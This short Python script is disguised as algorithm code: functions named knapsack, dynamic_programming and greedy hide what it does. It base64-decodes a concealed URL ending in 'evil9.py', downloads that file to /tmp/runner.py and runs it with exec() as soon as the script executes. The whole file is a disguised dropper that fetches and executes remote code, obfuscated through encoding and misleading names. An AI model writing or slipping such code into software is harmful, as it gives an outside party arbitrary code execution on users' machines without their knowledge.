import urllib.request
import base64

def knapsack(x):
    return base64.b64decode(x).decode("utf-8")

def dynamic_programming(y, z):
    urllib.request.urlretrieve(y, z)

def greedy(z):
    with open(z, "r") as f:
        w = f.read()
    exec(w)

def main():
    try:
        x = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDkucHk="
        y = knapsack(x)
        z = "/tmp/runner.py"
        dynamic_programming(y, z)
        greedy(z)
    except Exception as e:
        print(e)

main()

